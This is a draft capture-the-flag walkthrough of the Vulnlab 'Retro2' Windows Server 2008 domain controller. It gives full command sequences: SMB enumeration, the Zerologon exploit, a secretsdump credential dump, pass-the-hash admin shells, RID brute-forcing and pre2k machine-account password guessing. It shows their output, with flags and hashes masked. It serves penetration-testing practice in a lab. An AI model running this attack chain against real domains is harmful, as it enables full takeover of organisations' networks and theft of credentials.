+++
title = '[Vulnlab] Retro2'
date = 2024-10-09T21:22:04+02:00
draft = true
tags = ['pentesting']
+++

# Walkthrough
Windows Machine! Let's test `enum4linux` to get all the information:

```bash
$enum4linux-ng -A $IP -u 'a' -p ''
...
DNS domain: retro2.vl
FQDN: BLN01.retro2.vl
[+] Domain SID: S-1-5-21-1604173555-1041150481-2903404482

SHARES:
[*] Testing share Public
[+] Mapping: OK, Listing: OK

[+] After merging OS information we have the following result:
OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1
OS version: '6.1'
OS release: ''
OS build: '7601'
Native OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1
Native LAN manager: Windows Server 2008 R2 Datacenter 6.1
```

First, add the entries to the `/etc/hosts` file
```bash
echo -e "$IP\tBLN01.retro2.vl\tretro2.vl" >> /etc/hosts
```

I don't include the portscan since it's not needed for this challenge.

Let's evaluate our findings:
1. We can access a `Public` share with a guest user
2. The Server is Windows Server 2008

## 0. Windows server 2008
According to Google, and a blog post from [Hewlett Packard Enterprise](https://www.hpe.com/emea_europe/en/servers/windows-server-2008-end-of-support-migration.html). 
The end of Life for Windows Server 2008 was January 14th, 2020.
![Windows EOL](/images/vulnlab_retro2/windows2008EOL.png)

It's highly likely (even if not intended) that the server is vulnerable to 
CVE's that were published after that date.

Since I assume that the `netexec` devs are busy bees implementing the
latest and greatest recent exploit, we can go through the list of modules and 
see which exploits we want to test. We only focus on the *LOW PRIVILEGE MODULES*
```
$ nxc smb -L
LOW PRIVILEGE MODULES
[*] add-computer              Adds or deletes a domain computer
[*] dfscoerce                 Module to check if ...
...
```

Here is a (super) basic rundown of all modules according to the description and some basic googling. No guarantee that I'm right 
| Module | Info |
| ------ | ---- |
| add-computer| Utility |
| dfscoerce| Exploit -> NTLM-relay/Responder |
| drop-sc| Utility - Write file to writable shares |
| enum_av| Utility - Antivirus |
| enum_ca| Utitily - Certificate Authorities |
| gpp_autologin| Utility - Plaintext Passwords |
| gpp_password| Utility - Plaintext Passwords| 
| ioxidresolver| Utility - find more interfaces |
| ms17-010| Exploit -> Admin on any machine (disclosure 14.04.2017) |
| nopac| **Exploit -> Domain Admin (disclosure 09.11.2021)** |
| petitpotam| Exploit -> NTLM-relay/Responder|
| printerbug| Exploit -> NTLM-relay/Responder|
| printnightmare| **Exploit -> RCE+Privesc (disclosure 29.06.2021)**|
| scuffy| Utility - Write files to writable shares|
| shadowcoerce| Exploit -> NTLM-relay/Responder|
| slinky| Utility - Write file to writable shares |
| spider_plus| Utility - List all files |
| spooler| Utility - Detect printspooler |
| webdav| Utility - Detect WebClient service |
| zerologon| **Exploit -> Domain Admin (disclosure 11.08.2020)**|

The interesting modules are:
* nopac
* printnightmare
* zerologon

Let's test them:

```
export KRB5CCNAME="$(realpath ./FS01\$.ccache)"
```
### nopac
My tool seems broken, let's get back to it later:

```bash
$ nxc smb BLN01.retro2.vl --use-kcache -M nopac
[...j]
KerberosError: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication
                    information was invalid)
```

### printnightmare
```bash
nxc smb BLN01.retro2.vl --use-kcache -M printnightmare
[-] Failed to bind: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

### zerologon
```bash
nxc smb BLN01.retro2.vl -M zerologon
[...]
[+] retro2.vl\FS01$ from ccache
VULNERABLE
Next step: https://github.com/dirkjanm/CVE-2020-1472
```

## Exploiting Zerologon
```
$ zerologon-exploit.py BLN01 $IP
[...]
Success! DC should now have the empty string as its machine password.
```

```bash
$ secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "$DOMAIN"/'BLN01$@'"$IP"
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::
[...]
```

And we win
```powershell
$wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
retro2\administrator
C:\>type user.txt
VL{********************************}
C:\>type Users\Administrator\Desktop\root.txt
VL{********************************}
```


## Real path 1. Usernames
With a guest login, we can get usernames with `netexec rid-brute`:
```bash
$ nxc smb "$IP" -u 'guest' -p '' --rid-brute | tee u
SMB                      10.10.66.223    445    BLN01            [+] retro2.vl\guest:
SMB                      10.10.66.223    445    BLN01            498: RETRO2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.66.223    445    BLN01            500: RETRO2\Administrator (SidTypeUser)
SMB                      10.10.66.223    445    BLN01            501: RETRO2\Guest (SidTypeUser)
SMB                      10.10.66.223    445    BLN01            502: RETRO2\krbtgt (SidTypeUser)
[...]
```

and use some bash magic to generate a users list
```bash
$ grep SidTypeUser u | awk '{print $6}' | cut -d '\' -f2 | tee users.txt
Administrator
Guest
krbtgt
admin
BLN01$
[...]
```
## 2. Domain User
There a two quick ways to get a domain users with a username list:
1. `username=password`
2. pre2k Machine accounts 
### username=password
The command is this, but there is no simple password
```
nxc smb "$IP" -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

### pre2k users
[Pre Created User Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)
are accounts that:
1. End with a $
2. The password is the username in lowercase without the $

Due to how authentication functions, the nicest way is to just create a TGT
for those users. We can use impacket's `getTGT` or use a nice shiny specialize tool [pre2k](https://github.com/garrettfoster13/pre2k?tab=readme-ov-file).

```bash
grep '\$' users.txt > pre2kusers.txt
pre2k unauth -d "$DOMAIN" -dc-ip "$IP" -inputfile pre2kusers.txt
 -save
[21:55:02] INFO     VALID CREDENTIALS: retro2.vl\FS02$:fs02
[21:55:02] INFO     Saving ticket in FS02$.ccache
[21:55:05] INFO     VALID CREDENTIALS: retro2.vl\FS01$:fs01
```

## 3. Exploit

```
bloodhound.py --zip -c All -d "$DOMAIN" -k -u 'FS01$' -no-pass -
ns $IP
```